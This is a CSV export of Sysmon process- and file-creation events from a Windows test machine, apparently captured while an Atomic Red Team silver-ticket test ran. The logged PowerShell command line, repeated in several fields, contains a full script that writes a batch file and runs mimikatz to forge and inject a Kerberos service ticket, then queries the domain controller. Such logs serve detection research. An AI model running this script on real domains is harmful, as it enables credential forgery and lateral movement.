Microsoft-Windows-Sysmon/Operational,"""C:\Windows\system32\runas.exe"" /netonly /user:fake C:\Users\User\AppData\Local\Temp\silver.bat",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Run As Utility,,,,,,,1,9457,,10.0.22621.1 (WinBuild.160101.0800),"MD5=AB7024BDCBC308CE40ADE31373D2719A,SHA256=2E889BA98EB18739E33BB28412F2D4E847BB2B56CBD74D0A4488FF5F9C756BDE,IMPHASH=E9DF230F3CED78C5C775014DECE4BA58",C:\Windows\System32\runas.exe,,Medium,0x8000000000000000,Information,{fda94052-3502-658d-b367-080000000000},0x867b3,"Process Create:

RuleName: -

UtcTime: 2023-12-28 09:46:34.662

ProcessGuid: {fda94052-43fa-658d-6802-000000000b00}

ProcessId: 1732

Image: C:\Windows\System32\runas.exe

FileVersion: 10.0.22621.1 (WinBuild.160101.0800)

Description: Run As Utility

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: RUNAS.EXE

CommandLine: ""C:\Windows\system32\runas.exe"" /netonly /user:fake C:\Users\User\AppData\Local\Temp\silver.bat

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=AB7024BDCBC308CE40ADE31373D2719A,SHA256=2E889BA98EB18739E33BB28412F2D4E847BB2B56CBD74D0A4488FF5F9C756BDE,IMPHASH=E9DF230F3CED78C5C775014DECE4BA58

ParentProcessGuid: {fda94052-43f8-658d-6602-000000000b00}

ParentProcessId: 660

ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

ParentCommandLine: ""powershell.exe"" & {Remove-Item $env:TEMP\silver.bat -ErrorAction Ignore
Remove-Item $env:TEMP\silver.txt -ErrorAction Ignore

# get current domain SID if default was used
$domain_sid = \""""S-1-5-21-DEFAULT\""""
If ($domain_sid -Match \""""DEFAULT\"""") {
  # code from https://www.sevecek.com/EnglishPages/Lists/Posts/Post.aspx?ID=60
  $domain = gwmi Win32_ComputerSystem | Select -Expand Domain
  $krbtgtSID = (New-Object Security.Principal.NTAccount $domain\krbtgt).Translate([Security.Principal.SecurityIdentifier]).Value
  $domain_sid = $krbtgtSID.SubString(0, $krbtgtSID.LastIndexOf('-'))
}

# create batch file with commands to run in a separate \""""runas /netonly\"""" session
# so we don't purge Kerberos ticket from the current Windows session
# its output goes to silver.txt temp file, because we cannot capture \""""runas /netonly\"""" output otherwise
@\""""
>%TEMP%\silver.txt 2>&1 (
  echo Purge existing tickets and create silver ticket:
  klist purge
  C:\AtomicRedTeam\atomics\..\ExternalPayloads\mimikatz\x64\mimikatz.exe \""""kerberos::golden /domain:%userdnsdomain% /sid:DOMAIN_SID /aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9 /user:silverticketfakeuser /service:HOST /target:%logonserver:\\=%.%userdnsdomain% /ptt\"""" \""""exit\""""

  echo.
  echo executing:schtasks /query /S %logonserver:\\=%.%userdnsdomain%
  schtasks /query /S %logonserver:\\=%.%userdnsdomain%
  
  echo.
  echo Tickets after requesting schtasks:
  klist

  echo.
  echo End of Silver Ticket attack
)
\""""@ -Replace \""""DOMAIN_SID\"""", $domain_sid | Out-File -Encoding OEM $env:TEMP\silver.bat

# run batch file in a new empty session (password and username do not matter)
echo \""""foo\"""" | runas /netonly /user:fake \""""$env:TEMP\silver.bat\"""" | Out-Null

# wait until the output file has logged the entire attack
do {
  Start-Sleep 1 # wait a bit so the output file has time to be created
  Get-Content -Path \""""$env:TEMP\silver.txt\"""" -Wait | ForEach-Object {
    if ($_ -match 'End of Silver Ticket attack') { break } 
  }
} while ($false) # dummy loop so that 'break' can be used

# show output from new empty session
Get-Content $env:TEMP\silver.txt

# cleanup temp files
Remove-Item $env:TEMP\silver.bat -ErrorAction Ignore
Remove-Item $env:TEMP\silver.txt -ErrorAction Ignore}

ParentUser: WINDEV2309EVAL\User",Info,RUNAS.EXE,"""powershell.exe"" & {Remove-Item $env:TEMP\silver.bat -ErrorAction Ignore
Remove-Item $env:TEMP\silver.txt -ErrorAction Ignore

# get current domain SID if default was used
$domain_sid = \""""S-1-5-21-DEFAULT\""""
If ($domain_sid -Match \""""DEFAULT\"""") {
  # code from https://www.sevecek.com/EnglishPages/Lists/Posts/Post.aspx?ID=60
  $domain = gwmi Win32_ComputerSystem | Select -Expand Domain
  $krbtgtSID = (New-Object Security.Principal.NTAccount $domain\krbtgt).Translate([Security.Principal.SecurityIdentifier]).Value
  $domain_sid = $krbtgtSID.SubString(0, $krbtgtSID.LastIndexOf('-'))
}

# create batch file with commands to run in a separate \""""runas /netonly\"""" session
# so we don't purge Kerberos ticket from the current Windows session
# its output goes to silver.txt temp file, because we cannot capture \""""runas /netonly\"""" output otherwise
@\""""
>%TEMP%\silver.txt 2>&1 (
  echo Purge existing tickets and create silver ticket:
  klist purge
  C:\AtomicRedTeam\atomics\..\ExternalPayloads\mimikatz\x64\mimikatz.exe \""""kerberos::golden /domain:%userdnsdomain% /sid:DOMAIN_SID /aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9 /user:silverticketfakeuser /service:HOST /target:%logonserver:\\=%.%userdnsdomain% /ptt\"""" \""""exit\""""

  echo.
  echo executing:schtasks /query /S %logonserver:\\=%.%userdnsdomain%
  schtasks /query /S %logonserver:\\=%.%userdnsdomain%
  
  echo.
  echo Tickets after requesting schtasks:
  klist

  echo.
  echo End of Silver Ticket attack
)
\""""@ -Replace \""""DOMAIN_SID\"""", $domain_sid | Out-File -Encoding OEM $env:TEMP\silver.bat

# run batch file in a new empty session (password and username do not matter)
echo \""""foo\"""" | runas /netonly /user:fake \""""$env:TEMP\silver.bat\"""" | Out-Null

# wait until the output file has logged the entire attack
do {
  Start-Sleep 1 # wait a bit so the output file has time to be created
  Get-Content -Path \""""$env:TEMP\silver.txt\"""" -Wait | ForEach-Object {
    if ($_ -match 'End of Silver Ticket attack') { break } 
  }
} while ($false) # dummy loop so that 'break' can be used

# show output from new empty session
Get-Content $env:TEMP\silver.txt

# cleanup temp files
Remove-Item $env:TEMP\silver.bat -ErrorAction Ignore
Remove-Item $env:TEMP\silver.txt -ErrorAction Ignore}",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,{fda94052-43f8-658d-6602-000000000b00},660,WINDEV2309EVAL\User,{fda94052-43fa-658d-6802-000000000b00},7044,1732,Microsoft® Windows® Operating System,,,,,"
      ",-,,,,,,2023-12-28T09:46:34.6645706Z,,,Process Create (rule: ProcessCreate),1,6672,WINDEV2309EVAL\User,S-1-5-18,2023-12-28 09:46:34.662,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T09:46:34.6645706Z""/>
      <EventRecordID>9457</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-28 09:46:34.662</Data>
      <Data Name=""ProcessGuid"">{fda94052-43fa-658d-6802-000000000b00}</Data>
      <Data Name=""ProcessId"">1732</Data>
      <Data Name=""Image"">C:\Windows\System32\runas.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.1 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Run As Utility</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">RUNAS.EXE</Data>
      <Data Name=""CommandLine"">""C:\Windows\system32\runas.exe"" /netonly /user:fake C:\Users\User\AppData\Local\Temp\silver.bat</Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{fda94052-3502-658d-b367-080000000000}</Data>
      <Data Name=""LogonId"">0x867b3</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=AB7024BDCBC308CE40ADE31373D2719A,SHA256=2E889BA98EB18739E33BB28412F2D4E847BB2B56CBD74D0A4488FF5F9C756BDE,IMPHASH=E9DF230F3CED78C5C775014DECE4BA58</Data>
      <Data Name=""ParentProcessGuid"">{fda94052-43f8-658d-6602-000000000b00}</Data>
      <Data Name=""ParentProcessId"">660</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""ParentCommandLine"">""powershell.exe"" &amp; {Remove-Item $env:TEMP\silver.bat -ErrorAction Ignore
Remove-Item $env:TEMP\silver.txt -ErrorAction Ignore

# get current domain SID if default was used
$domain_sid = \""""S-1-5-21-DEFAULT\""""
If ($domain_sid -Match \""""DEFAULT\"""") {
  # code from https://www.sevecek.com/EnglishPages/Lists/Posts/Post.aspx?ID=60
  $domain = gwmi Win32_ComputerSystem | Select -Expand Domain
  $krbtgtSID = (New-Object Security.Principal.NTAccount $domain\krbtgt).Translate([Security.Principal.SecurityIdentifier]).Value
  $domain_sid = $krbtgtSID.SubString(0, $krbtgtSID.LastIndexOf('-'))
}

# create batch file with commands to run in a separate \""""runas /netonly\"""" session
# so we don't purge Kerberos ticket from the current Windows session
# its output goes to silver.txt temp file, because we cannot capture \""""runas /netonly\"""" output otherwise
@\""""
&gt;%TEMP%\silver.txt 2&gt;&amp;1 (
  echo Purge existing tickets and create silver ticket:
  klist purge
  C:\AtomicRedTeam\atomics\..\ExternalPayloads\mimikatz\x64\mimikatz.exe \""""kerberos::golden /domain:%userdnsdomain% /sid:DOMAIN_SID /aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9 /user:silverticketfakeuser /service:HOST /target:%logonserver:\\=%.%userdnsdomain% /ptt\"""" \""""exit\""""

  echo.
  echo executing:schtasks /query /S %logonserver:\\=%.%userdnsdomain%
  schtasks /query /S %logonserver:\\=%.%userdnsdomain%
  
  echo.
  echo Tickets after requesting schtasks:
  klist

  echo.
  echo End of Silver Ticket attack
)
\""""@ -Replace \""""DOMAIN_SID\"""", $domain_sid | Out-File -Encoding OEM $env:TEMP\silver.bat

# run batch file in a new empty session (password and username do not matter)
echo \""""foo\"""" | runas /netonly /user:fake \""""$env:TEMP\silver.bat\"""" | Out-Null

# wait until the output file has logged the entire attack
do {
  Start-Sleep 1 # wait a bit so the output file has time to be created
  Get-Content -Path \""""$env:TEMP\silver.txt\"""" -Wait | ForEach-Object {
    if ($_ -match 'End of Silver Ticket attack') { break } 
  }
} while ($false) # dummy loop so that 'break' can be used

# show output from new empty session
Get-Content $env:TEMP\silver.txt

# cleanup temp files
Remove-Item $env:TEMP\silver.bat -ErrorAction Ignore
Remove-Item $env:TEMP\silver.txt -ErrorAction Ignore}</Data>
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-28 09:46:34.662

ProcessGuid: {fda94052-43fa-658d-6802-000000000b00}

ProcessId: 1732

Image: C:\Windows\System32\runas.exe

FileVersion: 10.0.22621.1 (WinBuild.160101.0800)

Description: Run As Utility

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: RUNAS.EXE

CommandLine: ""C:\Windows\system32\runas.exe"" /netonly /user:fake C:\Users\User\AppData\Local\Temp\silver.bat

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=AB7024BDCBC308CE40ADE31373D2719A,SHA256=2E889BA98EB18739E33BB28412F2D4E847BB2B56CBD74D0A4488FF5F9C756BDE,IMPHASH=E9DF230F3CED78C5C775014DECE4BA58

ParentProcessGuid: {fda94052-43f8-658d-6602-000000000b00}

ParentProcessId: 660

ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

ParentCommandLine: ""powershell.exe"" &amp; {Remove-Item $env:TEMP\silver.bat -ErrorAction Ignore
Remove-Item $env:TEMP\silver.txt -ErrorAction Ignore

# get current domain SID if default was used
$domain_sid = \""""S-1-5-21-DEFAULT\""""
If ($domain_sid -Match \""""DEFAULT\"""") {
  # code from https://www.sevecek.com/EnglishPages/Lists/Posts/Post.aspx?ID=60
  $domain = gwmi Win32_ComputerSystem | Select -Expand Domain
  $krbtgtSID = (New-Object Security.Principal.NTAccount $domain\krbtgt).Translate([Security.Principal.SecurityIdentifier]).Value
  $domain_sid = $krbtgtSID.SubString(0, $krbtgtSID.LastIndexOf('-'))
}

# create batch file with commands to run in a separate \""""runas /netonly\"""" session
# so we don't purge Kerberos ticket from the current Windows session
# its output goes to silver.txt temp file, because we cannot capture \""""runas /netonly\"""" output otherwise
@\""""
&gt;%TEMP%\silver.txt 2&gt;&amp;1 (
  echo Purge existing tickets and create silver ticket:
  klist purge
  C:\AtomicRedTeam\atomics\..\ExternalPayloads\mimikatz\x64\mimikatz.exe \""""kerberos::golden /domain:%userdnsdomain% /sid:DOMAIN_SID /aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9 /user:silverticketfakeuser /service:HOST /target:%logonserver:\\=%.%userdnsdomain% /ptt\"""" \""""exit\""""

  echo.
  echo executing:schtasks /query /S %logonserver:\\=%.%userdnsdomain%
  schtasks /query /S %logonserver:\\=%.%userdnsdomain%
  
  echo.
  echo Tickets after requesting schtasks:
  klist

  echo.
  echo End of Silver Ticket attack
)
\""""@ -Replace \""""DOMAIN_SID\"""", $domain_sid | Out-File -Encoding OEM $env:TEMP\silver.bat

# run batch file in a new empty session (password and username do not matter)
echo \""""foo\"""" | runas /netonly /user:fake \""""$env:TEMP\silver.bat\"""" | Out-Null

# wait until the output file has logged the entire attack
do {
  Start-Sleep 1 # wait a bit so the output file has time to be created
  Get-Content -Path \""""$env:TEMP\silver.txt\"""" -Wait | ForEach-Object {
    if ($_ -match 'End of Silver Ticket attack') { break } 
  }
} while ($false) # dummy loop so that 'break' can be used

# show output from new empty session
Get-Content $env:TEMP\silver.txt

# cleanup temp files
Remove-Item $env:TEMP\silver.bat -ErrorAction Ignore
Remove-Item $env:TEMP\silver.txt -ErrorAction Ignore}

ParentUser: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,2023-12-28 09:46:34.620,,,,,,,,,11,9456,,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,0x8000000000000000,Information,,,"File created:

RuleName: -

UtcTime: 2023-12-28 09:46:34.620

ProcessGuid: {fda94052-43f8-658d-6602-000000000b00}

ProcessId: 660

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

TargetFilename: C:\Users\User\AppData\Local\Temp\silver.bat

CreationUtcTime: 2023-12-28 09:46:34.620

User: WINDEV2309EVAL\User",Info,,,,,,,{fda94052-43f8-658d-6602-000000000b00},7044,660,,,,,,"
      ",-,,,,,,2023-12-28T09:46:34.6277603Z,C:\Users\User\AppData\Local\Temp\silver.bat,,File created (rule: FileCreate),,6672,WINDEV2309EVAL\User,S-1-5-18,2023-12-28 09:46:34.620,2,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>11</EventID>
      <Version>2</Version>
      <Level>4</Level>
      <Task>11</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T09:46:34.6277603Z""/>
      <EventRecordID>9456</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-28 09:46:34.620</Data>
      <Data Name=""ProcessGuid"">{fda94052-43f8-658d-6602-000000000b00}</Data>
      <Data Name=""ProcessId"">660</Data>
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""TargetFilename"">C:\Users\User\AppData\Local\Temp\silver.bat</Data>
      <Data Name=""CreationUtcTime"">2023-12-28 09:46:34.620</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>File created:

RuleName: -

UtcTime: 2023-12-28 09:46:34.620

ProcessGuid: {fda94052-43f8-658d-6602-000000000b00}

ProcessId: 660

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

TargetFilename: C:\Users\User\AppData\Local\Temp\silver.bat

CreationUtcTime: 2023-12-28 09:46:34.620

User: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>File created (rule: FileCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,2023-12-28 09:46:32.821,,,,,,,,,11,9455,,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,0x8000000000000000,Information,,,"File created:

RuleName: -

UtcTime: 2023-12-28 09:46:32.821

ProcessGuid: {fda94052-43f8-658d-6602-000000000b00}

ProcessId: 660

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

TargetFilename: C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_bdp0b34x.vun.ps1

CreationUtcTime: 2023-12-28 09:46:32.821

User: WINDEV2309EVAL\User",Info,,,,,,,{fda94052-43f8-658d-6602-000000000b00},7044,660,,,,,,"
      ",-,,,,,,2023-12-28T09:46:32.8275701Z,C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_bdp0b34x.vun.ps1,,File created (rule: FileCreate),,6672,WINDEV2309EVAL\User,S-1-5-18,2023-12-28 09:46:32.821,2,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>11</EventID>
      <Version>2</Version>
      <Level>4</Level>
      <Task>11</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T09:46:32.8275701Z""/>
      <EventRecordID>9455</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-28 09:46:32.821</Data>
      <Data Name=""ProcessGuid"">{fda94052-43f8-658d-6602-000000000b00}</Data>
      <Data Name=""ProcessId"">660</Data>
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""TargetFilename"">C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_bdp0b34x.vun.ps1</Data>
      <Data Name=""CreationUtcTime"">2023-12-28 09:46:32.821</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>File created:

RuleName: -

UtcTime: 2023-12-28 09:46:32.821

ProcessGuid: {fda94052-43f8-658d-6602-000000000b00}

ProcessId: 660

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

TargetFilename: C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_bdp0b34x.vun.ps1

CreationUtcTime: 2023-12-28 09:46:32.821

User: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>File created (rule: FileCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
